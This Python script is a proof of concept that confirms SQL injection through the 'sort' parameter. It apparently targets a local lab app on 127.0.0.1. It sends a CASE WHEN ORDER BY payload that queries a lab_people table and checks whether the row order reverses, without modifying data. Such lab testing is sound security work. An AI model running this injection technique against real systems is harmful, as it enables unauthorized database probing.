#!/usr/bin/env python3
import os
import sys
import re
import html
import urllib.request
import urllib.parse
import urllib.error

BASE_HOST = "127.0.0.1"
BASE_PORT = 4280
BASE_URL = f"http://{BASE_HOST}:{BASE_PORT}"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def fetch(sort_value):
    path = os.environ.get("ENTRY_PATH", "")
    if (
        not path.startswith("/")
        or path.startswith("//")
        or "://" in path
        or "?" in path
        or "#" in path
    ):
        print("必须设置 ENTRY_PATH 为本地入口路径，例如 /index.php；不得包含主机名、查询串或片段。")
        sys.exit(2)

    url = BASE_URL + path + "?" + urllib.parse.urlencode({"sort": sort_value})
    opener = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(url, method="GET")

    try:
        with opener.open(req, timeout=10) as resp:
            final = urllib.parse.urlsplit(resp.geturl())
            if final.scheme != "http" or final.hostname != BASE_HOST or final.port != BASE_PORT:
                raise RuntimeError("响应主机或端口不匹配，拒绝继续")
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        if 300 <= exc.code < 400:
            raise RuntimeError("检测到重定向，脚本拒绝跟随") from exc
        raise


def parse_rows(page):
    rows = []
    pattern = re.compile(r"<li>\s*([^：<]+)：([^<]*)</li>")
    for match in pattern.finditer(page):
        row_id = html.unescape(match.group(1)).strip()
        row_name = html.unescape(match.group(2)).strip()
        rows.append((row_id, row_name))
    return rows


def main():
    expected_normal = [("1", "Alice"), ("2", "Bob"), ("3", "Carol")]
    expected_test = [("3", "Carol"), ("2", "Bob"), ("1", "Alice")]
    payload = "(CASE WHEN (SELECT COUNT(*) FROM lab_people)=3 THEN -id ELSE id END)"

    normal_rows = parse_rows(fetch("id"))
    test_rows = parse_rows(fetch(payload))

    print("普通请求解析记录:", normal_rows)
    print("测试请求解析记录:", test_rows)

    if normal_rows != expected_normal:
        print("无法判断：普通对照不是预置3行记录。请检查ENTRY_PATH、bootstrap连接、lab_people表及预置数据。")
        sys.exit(1)

    if test_rows == normal_rows:
        print("未观察到注入表达式改变排序：可能未注入、条件不成立或存在样本外过滤。")
        sys.exit(1)

    if test_rows == expected_test:
        print("成功：测试请求解析记录为逆序，证明GET sort进入了ORDER BY语法结构。数据库记录未修改。")
        sys.exit(0)

    print("测试记录不符合预期逆序，无法确认漏洞触发；请检查MariaDB日志、SQL模式及样本外过滤。")
    sys.exit(1)


if __name__ == "__main__":
    main()
